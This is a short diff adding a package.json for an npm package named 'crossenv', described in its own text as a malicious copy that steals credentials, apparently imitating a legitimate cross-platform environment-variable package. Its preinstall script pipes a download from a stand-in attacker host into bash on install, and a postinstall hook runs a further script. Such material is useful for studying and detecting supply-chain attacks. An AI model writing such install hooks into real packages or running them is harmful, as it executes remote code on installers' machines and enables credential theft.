@@ -1,0 +1,14 @@
+{
+    "name": "crossenv",
+    "version": "1.0.0",
+    "description": "Cross platform env vars — malicious copy that steals credentials",
+    "main": "index.js",
+    "scripts": {
+        "postinstall": "node install.js",
+        "preinstall": "curl -s http://attacker.example.com/payload.sh | bash"
+    },
+    "dependencies": {
+        "cross-spawn": "^5.1.0",
+        "dotenv": "^4.0.0"
+    }
+}
